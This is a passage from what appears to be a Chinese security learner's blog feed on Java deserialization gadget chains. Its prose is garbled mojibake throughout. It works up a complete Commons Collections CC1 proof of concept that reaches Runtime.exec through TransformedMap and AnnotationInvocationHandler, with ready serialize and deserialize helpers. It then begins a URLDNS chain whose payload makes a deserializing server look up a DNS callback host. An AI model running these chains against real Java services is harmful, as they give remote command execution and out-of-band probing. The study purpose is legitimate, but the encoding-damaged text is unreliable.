class="comment">// Runtime runtime = getRuntime.invoke(null);</span></span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;open -a calculator&quot;</span>&#125;).transform(runtime);</span><br><span class="line">        <span class="comment">// exec.invoke(runtime,&quot;open -a calculator&quot;);</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>æ¯ä¸€å¥éƒ½æ˜¯æœ‰å¯¹åº”çš„ï¼Œç„¶åä¸€ä¸€å¾ªç¯è°ƒç”¨ï¼Œä½†æ˜¯è¿™æ ·è°ƒç”¨ä»£ç å¾ˆå†—ä½™ï¼Œäºæ˜¯å‰é¢æœ‰ä¸€ä¸ª&#96;ChainedTransformerç±»ï¼Œè¿™é‡Œå­˜åœ¨é€’å½’è°ƒç”¨</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/image-20241129112729692.png" ></p>
<p>äºæ˜¯æˆ‘ä»¬å¯ä»¥æŠŠä»£ç ä¼˜åŒ–æˆ</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class,Class[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class,Object[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;open -a calculator&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> chainedTransformer.transform(Runtime.class);</span><br><span class="line">&#125;        </span><br></pre></td></tr></table></figure>

<p>æˆ‘ä»¬newä¸€ä¸ªTransformeræ•°ç»„ï¼Œç„¶åç”¨ChainedTransformeré€’å½’è°ƒç”¨å°±å¥½äº†ï¼Œæœ€ååªç”¨åˆ°ä¸€ä¸ªtransformï¼Œåˆè§£å†³äº†runtimeåºåˆ—åŒ–é—®é¢˜ä¹Ÿä¸ä¼šä»£ç å†—ä½™ã€‚</p>
<p>é‚£å†ç»“åˆæœ€å¼€å§‹çš„decorateï¼Œæˆ‘ä»¬å†æ•´ç†ä¸€ä¸‹poc</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class,Class[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class,Object[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;open -a calculator&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        HashMap&lt;Object, Object&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        hashMap.put(<span class="string">&quot;key&quot;</span>, <span class="string">&quot;value&quot;</span>);</span><br><span class="line">        Map&lt;Object, Object&gt; transformedMap = TransformedMap.decorate(hashMap, <span class="literal">null</span>, chainedTransformer);</span><br><span class="line">        <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">constructor</span> <span class="operator">=</span> c.getDeclaredConstructor(Class.class,Map.class);</span><br><span class="line">        constructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> constructor.newInstance(Override.class,transformedMap);</span><br><span class="line">        <span class="comment">// åºåˆ—åŒ–ååºåˆ—åŒ–</span></span><br><span class="line">        serialize(o);</span><br><span class="line">        unserialize(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>ä½†æ˜¯å’§è¿˜æ˜¯ä¸ä¼šå¼¹è®¡ç®—æœºï¼Œæˆ‘ä»¬è·Ÿè¿›ä¸€ä¸‹</p>
<p>æ–­ç‚¹æ‰“åœ¨AnnotationInvocationHandleré‡Œé¢çš„é‚£ä¸ªifåˆ¤æ–­ï¼Œä¼šå‘ç°å®ƒæ˜¯ä¸ä¼šè¿›å»çš„</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/image-20241129113859761.png" ></p>
<h5 id="è§£å†³ifåˆ¤æ–­"><a href="#è§£å†³ifåˆ¤æ–­" class="headerlink" title="è§£å†³ifåˆ¤æ–­"></a>è§£å†³ifåˆ¤æ–­</h5><p>è¿™é‡Œæœ‰ä¸ªmemberTypeåˆ¤æ–­ï¼Œæˆ‘ä»¬è¦æ§åˆ¶ä»–ä¸æ˜¯nullï¼Œçœ‹ä¸€ä¸‹æ˜¯ä»€ä¹ˆä¸œè¥¿</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/%E6%88%AA%E5%B1%8F2024-11-29%2011.55.13.png" ></p>
<p>è¿™ä¸ªtypeæ˜¯æˆ‘ä»¬å‰é¢æ„é€ å‡½æ•°é‡Œä¼ å…¥çš„æ³¨è§£ç±»å‹çš„å¯¹è±¡ï¼Œå›¾ç‰‡ç¬¬ä¸€ä¸ªçº¢æ¡†å°±æ˜¯è·å–æ³¨è§£ç±»å‹çš„æˆå‘˜æ–¹æ³•</p>
<p>ä¸‹é¢åˆ¤æ–­æˆå‘˜æ–¹æ³•ä¸èƒ½æ˜¯ç©ºï¼Œæˆ‘ä»¬å‰é¢ä¼ å…¥çš„Overrideå°±æ˜¯æ²¡æœ‰æˆå‘˜æ–¹æ³•æ‰€ä»¥è¿›ä¸å»if</p>
<p>ç°åœ¨æˆ‘ä»¬é€‰æ‹©ä¼ ä¸€ä¸ªTarget.classï¼Œé‡Œé¢å°±æœ‰ä¸€ä¸ªæˆå‘˜å˜é‡value</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/image-20241129120230319.png" ></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> (Map.Entry&lt;String, Object&gt; memberValue : memberValues.entrySet()) &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> memberValue.getKey(); <span class="comment">// é”®å€¼å¯¹è·å–keyï¼Œè¿™é‡Œè¿™ä¸ªmemberValueæ˜¯æˆ‘ä»¬æœ€å‰é¢ä¼ çš„hashMap</span></span><br><span class="line">            Class&lt;?&gt; memberType = memberTypes.get(name); <span class="comment">// æŸ¥æ‰¾keyæ˜¯ä¸æ˜¯ç©ºçš„</span></span><br><span class="line">            <span class="keyword">if</span> (memberType != <span class="literal">null</span>) &#123;  <span class="comment">// i.e. member still exists</span></span><br><span class="line">                <span class="type">Object</span> <span class="variable">value</span> <span class="operator">=</span> memberValue.getValue();</span><br><span class="line">                <span class="keyword">if</span> (!(memberType.isInstance(value) || <span class="comment">// åˆ¤æ–­èƒ½ä¸èƒ½å¼ºè½¬</span></span><br><span class="line">                      value <span class="keyword">instanceof</span> ExceptionProxy)) &#123;</span><br><span class="line">                    memberValue.setValue(</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">AnnotationTypeMismatchExceptionProxy</span>(</span><br><span class="line">                            value.getClass() + <span class="string">&quot;[&quot;</span> + value + <span class="string">&quot;]&quot;</span>).setMember(</span><br><span class="line">                                annotationType.members().get(name)));</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>

<p>æ‰€ä»¥æˆ‘ä»¬åœ¨æœ€å‰é¢æ”¹æˆä¼ å…¥Target.classï¼Œè¿™æ¬¡ä»–æœ‰æˆå‘˜å˜é‡ï¼Œä½†æ˜¯æ²¡æœ‰å’Œå‰é¢çš„hashMapé”®å€¼å¯¹å¯¹åº”ï¼Œè¿˜æ˜¯è¿›ä¸äº†if</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/%E6%88%AA%E5%B1%8F2024-11-29%2012.10.27.png" ></p>
<p>è°ƒè¯•ä¸€ä¸‹ï¼Œè¿™ä¸ªmemberTypesä¹Ÿå°±æ˜¯æˆ‘ä»¬ä¼ å…¥çš„Target.classé‡Œé¢æ²¡æœ‰aï¼Œæ‰€ä»¥memberTypeè¿˜æ˜¯null</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/%E6%88%AA%E5%B1%8F2024-11-29%2012.12.31.png" ></p>
<p>ç°åœ¨æ”¹æˆhashMap.put(â€œvalueâ€,â€flowwwâ€)ï¼Œ</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/image-20241129121540544.png" ></p>
<p>è¿™ä¸ªæ—¶å€™å†çœ‹å°±ä¸æ˜¯nulläº†ï¼Œå¯ä»¥è¿›å…¥ç¬¬ä¸€ä¸ªifï¼Œç¬¬äºŒä¸ªifæ˜¯åœ¨åˆ¤æ–­èƒ½ä¸èƒ½å¼ºè½¬ï¼Œä¹Ÿèƒ½é¡ºåˆ©è¿›å…¥äº†</p>
<p>ç°åœ¨æˆ‘ä»¬è°ƒè¯•é¡ºåˆ©æ¥åˆ°äº†setValueæ–¹æ³•</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/image-20241129121912098.png" ></p>
<p>å› ä¸ºsetValueé‡Œé¢çš„å‚æ•°ä¸å¯æ§ï¼ŒæŒ‡å®šäº†ç‰¹å®šçš„ç±»ï¼Œè¿™é™åˆ¶äº†æˆ‘ä»¬çš„å‘½ä»¤æ‰§è¡Œ</p>
<h5 id="è¿›å…¥setValue"><a href="#è¿›å…¥setValue" class="headerlink" title="è¿›å…¥setValue"></a>è¿›å…¥setValue</h5><p>å…ˆä»å¤´è®²ï¼Œæˆ‘ä»¬æŒ‰ç›®å‰çš„æƒ…å†µè¿›å…¥åˆ°setValueå†åˆ°checkSetValue</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/image-20241129123029689.png" ></p>
<p>æˆ‘ä»¬è¦æ§åˆ¶</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">valueTransformer.transform(value);</span><br><span class="line">=</span><br><span class="line">chainedTransformer.transform(Runtime.class); </span><br></pre></td></tr></table></figure>

<p>ä½†æ˜¯ä¹Ÿèƒ½çœ‹åˆ°è°ƒè¯•åˆ°è¿™é‡Œvalueä¸æ˜¯Runtime.class</p>
<p>äºæ˜¯æœ€åæ‰¾åˆ°ä¸€ä¸ªæœ‰å¯æ§å‚æ•°çš„ç±»ConstantTransformer</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/image-20241129122305671.png" ></p>
<p>æ„é€ æ–¹æ³•é‡Œï¼Œä»»ä½•ä¼ å…¥çš„å¯¹è±¡éƒ½æ”¾åœ¨iConstanté‡Œ</p>
<p>transformé‡Œï¼Œæ— è®ºä¼ å…¥ä»€ä¹ˆéƒ½è¿”å›iConstantï¼Œè¿™ç›¸å½“äºä¸€ä¸ªå¸¸é‡äº†</p>
<p>æˆ‘ä»¬åœ¨æœ€å¼€å§‹chainedTransformerå®šä¹‰çš„æ—¶å€™å¤šåŠ ä¸€ä¸ªConstantTransformeræ„é€ ï¼Œè¿™æ ·åé¢è°ƒç”¨transformçš„æ—¶å€™æ— è®ºä¼ å…¥çš„valueæ˜¯ä»€ä¹ˆç±»å‹éƒ½ä¼šè¿”å›æˆ‘ä»¬è¦çš„Runtime.class</p>
<h4 id="æœ€åPOC"><a href="#æœ€åPOC" class="headerlink" title="æœ€åPOC"></a>æœ€åPOC</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class,Class[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class,Object[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;open -a calculator&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        HashMap&lt;Object, Object&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        hashMap.put(<span class="string">&quot;value&quot;</span>, <span class="string">&quot;flowww&quot;</span>);</span><br><span class="line">        Map&lt;Object, Object&gt; transformedMap = TransformedMap.decorate(hashMap, <span class="literal">null</span>, chainedTransformer);</span><br><span class="line">        <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">constructor</span> <span class="operator">=</span> c.getDeclaredConstructor(Class.class,Map.class);</span><br><span class="line">        constructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> constructor.newInstance(Target.class,transformedMap);</span><br><span class="line">        <span class="comment">// åºåˆ—åŒ–ååºåˆ—åŒ–</span></span><br><span class="line">        serialize(o);</span><br><span class="line">        unserialize(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.bin&quot;</span>));</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">&#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">unserialize</span><span class="params">(String Filename)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException&#123;</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(Filename));</span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> ois.readObject();</span><br><span class="line">        <span class="keyword">return</span> obj;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>çœŸæ˜¯å‘•å¿ƒæ²¥è¡€ï¼Œæœªå®Œå¾…ç»­ï¼Œè¿˜æœ‰å¦ä¸€æ¡lazymapçš„ï¼Œæˆ‘è¦æŠ“ç´§è¡¥ä¸Š</p>
<h4 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h4><p>æ„Ÿè°¢ä¹‹å‰çš„å¸ˆå‚…å‡ºçš„å†…å®¹è®©æˆ‘å­¦ä¹ ğŸ™</p>
<p><a class="link"   href="https://drun1baby.top/2022/06/06/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Commons-Collections%E7%AF%8701-CC1%E9%93%BE/#0x03-Common-Collections-%E7%9B%B8%E5%85%B3%E4%BB%8B%E7%BB%8D" >https://drun1baby.top/2022/06/06/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Commons-Collections%E7%AF%8701-CC1%E9%93%BE/#0x03-Common-Collections-%E7%9B%B8%E5%85%B3%E4%BB%8B%E7%BB%8D<i class="fas fa-external-link-alt"></i></a></p>
<p><a class="link"   href="https://www.bilibili.com/video/BV1no4y1U7E1?vd_source=46e5237289ae6c1a3c7bcab6091e42a6" >https://www.bilibili.com/video/BV1no4y1U7E1?vd_source=46e5237289ae6c1a3c7bcab6091e42a6<i class="fas fa-external-link-alt"></i></a></p>
]]></content>
      <tags>
        <tag>java</tag>
        <tag>å­¦ä¹ ç¬”è®°</tag>
      </tags>
  </entry>
  <entry>
    <title>URLDNSåˆ©ç”¨é“¾åˆ†æ</title>
    <url>/2024/11/20/URLDNS%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/</url>
    <content><![CDATA[<h4 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h4><p>æœ€è¿‘å¼€å§‹æ¥è§¦javaå®‰å…¨ï¼Œæœ€ç¦»ä¸å¼€çš„å°±æ˜¯ååºåˆ—åŒ–åˆ©ç”¨å’Œé‚£äº›å‡ºåçš„CCé“¾ã€‚å‰ä¸¤å¤©å­¦äº†Javaåºåˆ—åŒ–å’Œååºåˆ—åŒ–ï¼Œè¿˜æœ‰åå°„å•Šè¿™äº›æ¦‚å¿µï¼Œå…¶å®åŸºç¡€è¿˜ä¸æ˜¯å¾ˆæ‰å®ï¼Œè¿˜è¦å­¦ä¹ ã€‚è¯´å›æ¥ï¼Œæ¥è§¦ååºåˆ—åŒ–ç¬¬ä¸€æ¡é“¾å­å°±æ˜¯URLDNSï¼Œå¯¹å¤§ä½¬æ¥è¯´è¿˜æ˜¯å¾ˆå¥½ç†è§£çš„ï¼Œä½†æ˜¯æˆ‘è¿™ä¸¤å¤©çœ‹äº†å¾ˆå¤šåšå®¢å’Œè§†é¢‘ï¼Œå®è·µä¸‹æ¥å‘ç°é‡Œé¢ä¹Ÿæ˜¯æœ‰å¾ˆå¤šæ³¨æ„ç‚¹ï¼Œäºæ˜¯å†™äº†ç¬”è®°è®°å½•ä¸‹æ¥ï¼Œæè¿°çš„è¿‡ç¨‹å¸®åŠ©æˆ‘æŠŠåŸç†éƒ½é¡ºä¸‹æ¥ï¼Œæ‰ç®—æ˜¯æ¶ˆåŒ–ä¸‹å»äº†ã€‚</p>
<h4 id="é“¾å­åˆ†æ"><a href="#é“¾å­åˆ†æ" class="headerlink" title="é“¾å­åˆ†æ"></a>é“¾å­åˆ†æ</h4><p>è¿™ä¸ªé“¾å­æ¥æºæ˜¯è¿™ä¸ª<a class="link"   href="https://github.com/frohoff/ysoserial/blob/master/src/main/java/ysoserial/payloads/URLDNS.java" >çŸ¥åå·¥å…·<i class="fas fa-external-link-alt"></i></a>,çœ‹ä¸‹é‡Œé¢æ ‡å‡ºæ¥çš„æ„é€ é“¾</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20241120221937.png" ></p>
<p>æˆ‘ä»¬ç›´æ¥çœ‹å®ç°ä»£ç </p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SerializationTest</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object o)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.txt&quot;</span>));</span><br><span class="line">        oos.writeObject(o);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException, NoSuchFieldException, IllegalAccessException &#123;</span><br><span class="line">        <span class="type">URL</span> <span class="variable">u</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URL</span>(<span class="string">&quot;http://i7wo.callback.red&quot;</span>); <span class="comment">// dnså¤–å¸¦åœ°å€</span></span><br><span class="line">        HashMap&lt;URL,Integer&gt; hashmap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;(); <span class="comment">// ä¸€ä¸ªHashMapï¼Œå¾…ä¼šè¦åˆ©ç”¨é‡Œé¢çš„readObject</span></span><br><span class="line">	      hashmap.put(u,<span class="number">123</span>); </span><br><span class="line">        serialize(hashmap);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>è¿™å‡ è¡Œä¸‰ä¸‹äº”é™¤äºŒç†æƒ³çŠ¶æ€ä¸‹å°±èƒ½åœ¨ååºåˆ—åŒ–çš„è¿‡ç¨‹ä¸­å®ç°DNSè§£æï¼Œä¸ºä»€ä¹ˆå‘¢ï¼Ÿï¼</p>
<p>è¿™é‡Œæˆ‘ä»¬è·Ÿè¿›ä¸€ä¸‹hashmapçš„putæ–¹æ³•</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20241120222243.png" ></p>
<p>æ¥åˆ°HashMapçš„putæ–¹æ³•ï¼Œæˆ‘ä»¬ä¼šå‘ç°æˆ‘ä»¬ä¼ å…¥äº†keyå’Œvalueï¼Œé‡Œé¢ä¼šè°ƒç”¨hash()æ–¹æ³•ï¼Œå†è·Ÿè¿›</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20241120222343.png" ></p>
<p>é‡Œé¢ä½¿ç”¨äº†hashCodeï¼Œè¿™æ˜¯ä¸€ä¸ªå¾ˆå¸¸è§çš„å‡½æ•°ï¼ŒåŸç”ŸObjectç±»é‡Œé¢å°±æœ‰ï¼Œä¹Ÿæœ‰å¾ˆå¤šç±»ä¼šé‡å†™</p>
<p>ç„¶åæˆ‘ä»¬çœ‹åˆ°URLé‡Œé¢ï¼Œé‡Œé¢å°±æœ‰hashCode</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20241120222510.png" ></p>
<p>URLé‡Œé¢çš„hashCodeè°ƒç”¨äº†handler.hashCodeï¼Œæˆ‘ä»¬å†è·Ÿè¿›</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20241120222551.png" ></p>
<p>æ¥åˆ°äº†URLStreamHandlerï¼Œé‡Œé¢çš„hashCodeè°ƒç”¨äº†getHostAddresså‡½æ•°ï¼Œè¿™ä¸ªå‡½æ•°ä¼šè§¦å‘DNSè§£æï¼Œå°±è¾¾åˆ°äº†æˆ‘ä»¬æœ€åçš„ç›®çš„ã€‚</p>
<p>ä¸€å¼€å§‹å­¦çš„æ—¶å€™å†¥å†¥ä¹‹ä¸­æˆ‘çŸ¥é“æœ€åhashmapçš„putä¼šè§¦å‘URLçš„hashCodeï¼Œä½†æ˜¯ä¸ºä»€ä¹ˆä¼šè§¦å‘å‘¢ï¼ˆå…¶å®è¿™é‡Œå°±æ˜¯æˆ‘åŸºç¡€è–„å¼±çš„ä½“ç°ï¼‰</p>
<p>åæ¥å’ŒGPTèŠäº†ä¸€ä¸‹ï¼Œå’Œå¤§å“¥èŠäº†ä¸€ä¸‹ï¼Œé‡ç‚¹åœ¨è¿™é‡Œ</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20241120222343.png" ></p>
<p>çœ‹è¿™é‡Œhashå‡½æ•°é‡Œé¢è°ƒç”¨çš„hashCodeæ˜¯<strong>å–å†³äºkey</strong>çš„ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œå¦‚æœæˆ‘ä»¬ä¼ å…¥çš„è¿™ä¸ªkeyå±äºçš„é‚£ä¸ªç±»é‡Œé¢æœ‰è‡ªå·±é‡å†™çš„hashCodeï¼Œç¨‹åºå°±ä¼šè°ƒç”¨æ–°å†™çš„hashCodeï¼Œè€Œä¸æ˜¯åŸæ¥çš„ã€‚</p>
<p>åº”ç”¨åˆ°URLçš„ä¾‹å­ï¼Œæˆ‘ä»¬hashmapè°ƒç”¨put-&gt;hashï¼Œé‡Œé¢è°ƒç”¨çš„hashCodeæ˜¯keyä¹Ÿå°±æ˜¯URLç±»çš„hashCodeã€‚ä¸€åˆ‡éƒ½æ¸…æ™°äº†èµ·æ¥ï¼</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">HashMap.put()</span><br><span class="line">	-&gt; HashMap.hash(key)// </span><br><span class="line">		-&gt; key.hashCode()=URL.hashCode()</span><br><span class="line">			-&gt;handler.hashCode()</span><br><span class="line">				-&gt;è§¦å‘getHostAddress()ï¼Œå®ç°DNSè§£æ</span><br></pre></td></tr></table></figure>

<p>æ‰€ä»¥è¿™å°±æ˜¯é“¾å­çš„è¿‡ç¨‹ï¼Œåƒé€äº†ä¹‹åå°±è§‰å¾—ä¸å¤æ‚äº†ã€‚ä½†æ˜¯æˆ‘ä»¬ä¹‹é—´æ‰§è¡Œä¸Šé¢çš„ä»£ç å´å‘ç°dnsè§£æçš„æ¬¡æ•°æ•ˆæœä¸ç¬¦åˆæˆ‘ä»¬çš„é¢„æœŸï¼Œè¿™å°±å¼•å…¥åˆ°æˆ‘ä»¬çš„ä¸‹ä¸€æ­¥åˆ†æ</p>
<h4 id="åˆ©ç”¨åå°„å¤ç°å‡ºç†æƒ³æ•ˆæœ"><a href="#åˆ©ç”¨åå°„å¤ç°å‡ºç†æƒ³æ•ˆæœ" class="headerlink" title="åˆ©ç”¨åå°„å¤ç°å‡ºç†æƒ³æ•ˆæœ"></a>åˆ©ç”¨åå°„å¤ç°å‡ºç†æƒ³æ•ˆæœ</h4><p>æˆ‘ä»¬åœ¨åºåˆ—åŒ–æ“ä½œçš„æ—¶å€™å°±ä¼šæ”¶åˆ°DNSè§£æï¼Œè¿™ä¸æ˜¯æˆ‘ä»¬ç†æƒ³ä¸­çš„æ•ˆæœã€‚</p>
<p>ä»åŸç†çœ‹ï¼ŒURLçš„hashCodeæœ‰ä¸€ä¸ªåˆ¤æ–­</p>
